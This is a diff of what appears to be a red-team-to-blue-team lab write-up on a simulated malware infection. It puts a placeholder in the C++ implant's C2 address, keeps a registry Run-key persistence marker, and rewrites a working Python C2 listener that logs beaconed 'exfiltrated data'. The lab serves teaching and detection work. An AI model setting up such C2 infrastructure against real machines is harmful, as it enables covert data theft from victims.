@@ -561,7 +561,7 @@ In this scenario, we simulate a common entry-level malware infection. The attack
 using namespace std;
 
 // C2 Server Configuration
-string C2_IP = "192.168.200.129";
+string C2_IP = "YOUR_C2_IP_ADDRESS"; // I AM USING KALI LINUX
 int C2_PORT = 8080;
 
 // [T1547.001] Persistence: Writing to Registry Run Key
@@ -641,6 +641,8 @@ int main() {
 
 ```
 
+
+
 ---
 
 #### C2 Server Setup (Python)
@@ -650,46 +652,65 @@ int main() {
 ```python
 # Save this as C2.py on your Attacker Machine
 # Usage: python3 C2.py
+
 import os
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from datetime import datetime
 
 LOG_FILE = "C2_Exfiltrated_Data.txt"
 
-class C2Handler(BaseHTTPRequestHandler):
+class MegaC2Handler(BaseHTTPRequestHandler):
+    
+    def log_to_file(self, client_ip, data):
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(f"--- New Beacon ---\n")
+            f.write(f"Time: {timestamp}\n")
+            f.write(f"From: {client_ip}\n")
+            f.write(f"Data: {data}\n")
+            f.write("-" * 20 + "\n")
+
     def do_POST(self):
+       
         content_length = int(self.headers['Content-Length'])
         post_data = self.rfile.read(content_length).decode('utf-8')
+        client_ip = self.client_address[0]
         
-        # Log the received beacon data with a timestamp
-        with open(LOG_FILE, "a") as f:
-            f.write(f"[{datetime.now()}] From {self.client_address[0]}: {post_data}\n")
+        print(f"\n\033[92m[+] Received Beacon from {client_ip}\033[0m")
+        print(f"\033[94m[!] Data: {post_data}\033[0m")
+        
+        self.log_to_file(client_ip, post_data)
         
         self.send_response(200)
+        self.send_header('Content-type', 'text/plain')
         self.end_headers()
+        self.wfile.write(b"OK")
 
-# Start the server on Port 8080
-HTTPServer(('', 8080), C2Handler).serve_forever()
+    def log_message(self, format, *args):
+        return
+
+def run_server():
+    server_address = ('', 8080)
+    httpd = HTTPServer(server_address, MegaC2Handler)
+    print("\033[91m" + "="*40 + "\033[0m")
+    print("\033[1m  RED2BLUE - C2 LISTENER STARTED  \033[0m")
+    print(f"\033[93m Listening on port 8080... \033[0m")
+    print(f"\033[93m Logs will be saved to: {LOG_FILE} \033[0m")
+    print("\033[91m" + "="*40 + "\033[0m")
+    
+    try:
+        httpd.serve_forever()
+    except KeyboardInterrupt:
+        print("\n[!] Server Stopping...")
+        httpd.server_close()
+
+if __name__ == "__main__":
+    run_server()
 
 ```
 
+
 ---
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 
